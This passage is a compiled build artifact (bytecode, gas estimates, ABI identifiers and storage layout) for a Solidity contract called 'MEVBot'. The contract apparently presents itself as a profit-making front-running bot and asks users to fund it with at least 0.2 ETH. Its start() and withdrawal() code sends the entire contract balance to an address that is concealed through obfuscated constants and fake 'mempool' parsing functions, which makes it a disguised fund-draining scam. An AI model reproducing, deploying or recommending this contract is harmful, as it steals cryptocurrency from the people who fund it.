0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB25 PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xAF2 PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x56C JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7C5 JUMP JUMPDEST PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH4 0x8595CE91 SWAP1 POP PUSH1 0x0 PUSH3 0x68048 SWAP1 POP PUSH1 0x0 PUSH5 0xEC044CF08 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xA32 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4A7 PUSH2 0xA3D JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4BD DUP8 PUSH2 0x4B8 DUP9 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4DB PUSH2 0x4CD DUP8 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x4D6 DUP8 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4E8 DUP6 PUSH2 0x7D1 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4F5 DUP6 PUSH2 0x7D1 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x515 PUSH2 0x506 DUP7 DUP7 PUSH2 0x8D7 JUMP JUMPDEST PUSH2 0x510 DUP6 DUP6 PUSH2 0x8D7 JUMP JUMPDEST PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x558 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x8D7 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7B8 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x59E JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5C0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x611 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x621 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6BB JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65F JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66F JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6BA JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AD JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B9 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F9 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x709 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7A3 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x747 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x757 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7A2 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x795 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A1 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x582 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH4 0xC1B01A5 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x800 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x7F8 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x7DE JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x819 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x84C JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8CB JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x867 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x873 DUP4 PUSH2 0xA48 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x884 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8BD JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x855 JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x8FF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x932 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x9B0 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x957 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x974 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x942 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA23 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9CA JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9E7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9B5 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x901082 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7CF51 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xA62 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA97 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAEC JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xAAF JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xAE7 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAEC JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA26469706673582212204007 0xBE 0xC5 PUSH7 0x30B677258AC908 0xED MSTORE8 SWAP8 PUSH17 0x53E3BAABA4C545D175DC595C968CF28764 PUSH20 0x6F6C634300060600330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "592400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"start()": "infinite",
						"tokenName()": "infinite",
						"tokenSymbol()": "infinite",
						"withdrawal()": "infinite"
					},
					"internal": {
						"_callMEVAction()": "infinite",
						"beyond(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
						"calcLiquidityInContract(struct MEVBot.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findContracts(uint256,uint256,uint256,uint256)": "infinite",
						"findNewContracts(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "23",
						"getMemPoolHeight()": "23",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "23",
						"keccak(struct MEVBot.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"memcpy(uint256,uint256,uint256)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
						"orderContractsByLiquidity(struct MEVBot.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "213",
						"uint2str(uint256)": "infinite",
						"withdrawalProfits()": "infinite"
					}
				},
				"methodIdentifiers": {
					"start()": "be9a6555",
					"tokenName()": "6c02a931",
					"tokenSymbol()": "7b61c320",
					"withdrawal()": "d4e93292"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "contracts/bot.sol:MEVBot",
						"label": "tokenName",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 9,
						"contract": "contracts/bot.sol:MEVBot",
						"label": "tokenSymbol",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 11,
						"contract": "contracts/bot.sol:MEVBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {},
				"notice": "Testnet transactions will fail as there is no value Updated build Min liquidity not including gas fees needs to equal 0.2 ETH"
			}
		}
	}
}